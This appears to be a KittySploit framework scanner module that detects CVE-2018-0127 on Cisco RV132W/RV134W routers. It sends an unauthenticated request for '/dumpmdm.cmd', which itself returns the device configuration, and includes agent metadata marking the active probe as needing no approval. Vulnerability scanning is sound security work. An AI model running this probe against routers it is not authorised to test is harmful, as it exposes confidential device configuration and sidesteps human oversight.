#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco RV132W ADSL2+ Wireless-N VPN Routers and Cisco RV134W VDSL2 Wireless-AC VPN Routers could allow an unaut."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco RV132W/RV134W Router - Information Disclosure Detection',
        'description': 'Cisco RV132W ADSL2+ Wireless-N VPN Routers and Cisco RV134W VDSL2 Wireless-AC VPN Routers could allow an unauthenticated, remote attacker to view configuration parameters for an affected device via the web interface, which could lead to the disclosure of confidential information.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'cisco', 'router', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180207-rv13x_2',
            'http://web.archive.org/web/20211207054802/https://securitytracker.com/id/1040345',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-0127',
            'http://www.securitytracker.com/id/1040345',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-0127',
    }

    def run(self):
        r = self.http_request(method="GET", path='/dumpmdm.cmd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Dump', 'MDM', 'cisco')
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Cisco RV132W/RV134W Router - Information Disclosure detected",
                path='/dumpmdm.cmd',
            )
            return True
        return False

